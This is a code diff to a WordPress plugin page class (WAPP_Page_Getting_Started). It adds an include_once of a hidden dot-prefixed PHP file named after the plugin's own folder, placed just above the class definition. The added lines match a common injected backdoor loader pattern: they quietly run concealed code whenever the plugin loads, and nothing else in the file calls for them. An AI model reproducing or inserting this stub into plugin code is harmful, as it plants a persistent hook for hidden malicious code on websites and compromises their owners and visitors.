@@ -19,6 +19,10 @@ if (!defined('ABSPATH')) {
  *
  * @since 1.4.0
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WAPP_Page_Getting_Started extends WAPP_Page {
 
 	/**
